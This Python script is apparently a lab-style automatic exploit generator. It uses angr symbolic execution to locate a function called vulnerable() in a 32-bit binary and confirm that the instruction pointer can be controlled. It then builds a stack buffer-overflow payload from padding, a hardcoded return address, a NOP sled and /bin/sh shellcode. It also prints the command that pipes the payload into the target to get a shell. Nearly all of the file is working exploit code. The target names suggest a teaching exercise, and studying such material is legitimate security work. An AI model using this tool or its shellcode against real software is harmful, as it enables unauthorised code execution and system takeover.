import angr
import claripy
import struct
import os
import sys


def find_offset(binary_path):
    print(f"[*] Loading binary: {binary_path}")
    proj = angr.Project(binary_path, auto_load_libs=False)

    # Find vulnerable() address
    vuln_addr = None
    for sym, addr in proj.loader.main_object.symbols_by_name.items():
        if 'vulnerable' in sym:
            vuln_addr = addr.rebased_addr
            print(f"[+] Found vulnerable() at: {hex(vuln_addr)}")
            break

    if vuln_addr is None:
        print("[-] Could not find vulnerable() symbol")
        return None

    # Create symbolic input
    payload = claripy.BVS('payload', 200 * 8)

    # Start directly at vulnerable() bypassing all conditions in main()
    state = proj.factory.call_state(
        vuln_addr,
        stdin=angr.SimFile(name='stdin', content=payload)
    )

    state.options.add(angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS)
    state.options.add(angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY)

    simgr = proj.factory.simulation_manager(
        state,
        save_unconstrained=True
    )

    print(f"[*] Running symbolic execution...")
    simgr.run()

    if not simgr.unconstrained:
        print("[-] No unconstrained states found")
        return None

    for crashed_state in simgr.unconstrained:
        eip = crashed_state.regs.eip
        if crashed_state.solver.symbolic(eip):
            print(f"[+] EIP is symbolic - we control it!")

            # Constrain EIP to 0x41414141 and solve
            crashed_state.solver.add(eip == 0x41414141)
            concrete_payload = crashed_state.solver.eval(payload, cast_to=bytes)

            print(f"[+] Concrete payload (hex): {concrete_payload.hex()}")

            # Find 0x41414141 = four 0x41 bytes in payload
            target = b'\x41\x41\x41\x41'
            offset = concrete_payload.find(target)

            if offset != -1:
                print(f"[+] Offset found: {offset} bytes")
                return offset
            else:
                for j in range(len(concrete_payload) - 3):
                    if concrete_payload[j:j+4] == target:
                        print(f"[+] Offset found: {j} bytes")
                        return j

            print("[-] Could not find offset in payload")
            return None

    return None


def build_payload(binary_path, offset, args=None):
    print(f"[*] Building payload...")

    shellcode = bytes([
        0x31, 0xc0,             # xor eax, eax
        0x50,                   # push eax
        0x68, 0x2f, 0x2f, 0x73, 0x68,  # push "//sh"
        0x68, 0x2f, 0x62, 0x69, 0x6e,  # push "/bin"
        0x89, 0xe3,             # mov ebx, esp
        0x89, 0xc1,             # mov ecx, eax
        0x89, 0xc2,             # mov edx, eax
        0xb0, 0x0b,             # mov al, 11
        0xcd, 0x80              # int 0x80
    ])

    NOP  = b'\x90' * 200
    addr = 0xffffd640           # confirmed working stack address

    ret           = struct.pack('<I', addr)
    final_payload = b'A' * offset + ret + NOP + shellcode

    output = f"payload_{os.path.basename(binary_path)}"
    with open(output, 'wb') as f:
        f.write(final_payload)

    print(f"[+] Stack address: {hex(addr)}")
    print(f"[+] Payload saved: {output}")

    return addr, output, len(shellcode), len(NOP)


def generate_payload(binary_path, args=None):
    # Step 1 - find offset automatically via symbolic execution
    offset = find_offset(binary_path)

    if offset is None:
        print("[-] Could not find offset")
        return

    # Step 2 - build payload with known stack address
    found_addr, output, shellcode_len, nop_len = build_payload(
        binary_path, offset, args
    )

    print(f"\n[+] ===== SUCCESS =====")
    print(f"[+] Binary:        {binary_path}")
    print(f"[+] Offset:        {offset} bytes")
    print(f"[+] Return addr:   {hex(found_addr)}")
    print(f"[+] NOP sled:      {nop_len} bytes")
    print(f"[+] Shellcode:     {shellcode_len} bytes")
    print(f"[+] Total payload: {offset + 4 + nop_len + shellcode_len} bytes")
    print(f"[+] Payload saved: {output}")
    print(f"")
    if args:
        print(f"[+] Run: (cat {output}; cat) | {binary_path} {args}")
    else:
        print(f"[+] Run: (cat {output}; cat) | {binary_path}")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python aeg.py <binary> [args]")
        print("")
        print("Examples:")
        print("  python aeg.py ./target")
        print("  python aeg.py ./target2 hello")
        print("  python aeg.py ./target3 Apple")
        print("  python aeg.py ./target4 Banana")
        sys.exit(1)

    binary = sys.argv[1]
    args   = sys.argv[2] if len(sys.argv) > 2 else None

    generate_payload(binary, args)
